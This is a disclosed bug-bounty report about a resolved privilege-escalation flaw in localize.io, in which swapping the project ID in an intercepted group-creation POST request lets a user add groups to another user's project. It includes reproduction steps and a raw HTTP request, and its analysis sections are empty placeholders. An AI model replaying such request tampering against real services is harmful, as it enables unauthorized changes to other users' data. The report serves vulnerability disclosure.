---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '8102'
original_report_id: '8102'
title: Making groups in any project without permission
weakness: Privilege Escalation
team_handle: localize
created_at: '2014-04-19T03:54:45.493Z'
disclosed_at: '2014-04-20T02:52:34.946Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- privilege-escalation
---

# Making groups in any project without permission

## Metadata

- HackerOne Report ID: 8102
- Weakness: Privilege Escalation
- Program: localize
- Disclosed At: 2014-04-20T02:52:34.946Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Something Interesting happening here !! ;)

Steps to reproduce :

1) Suppose User1 have Public Project called http://www.localize.io/v/8h
2) In public project any other user ll not have permissions to edit project 
3) Now User2 want to make a group in http://www.localize.io/v/8h which is unlikely not possible .
4) Soo what now ?? :P
5) User2 ll go to his any own project and edit the project like (http://www.localize.io/pages/create_project/3F) and he ll create a new group there , while creating the new group intercept the request and change it with http://www.localize.io/v/8h
6) Bang !! The group ll be created on User1 side .

Request (From User2 side) :

POST /pages/create_project/3F HTTP/1.1
Host: www.localize.io
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:28.0) Gecko/20100101 Firefox/28.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.localize.io/pages/create_project/82
Cookie: PHPSESSID=srdrqpfu6k679bna6e2rtrsrq7
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 84

CSRFToken=NTc4NTUxMjY1MzUxZTllOGIwYWM4MC4yMjE1MjUxNw%3D%3D&addGroup%5Bname%5D=Test

Now he ll change the POST /pages/create_project/3F with POST /pages/create_project/8h

and send the request and group ll be created on User1 side .

Take a look and lemme know if you need more info .

Daksh

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
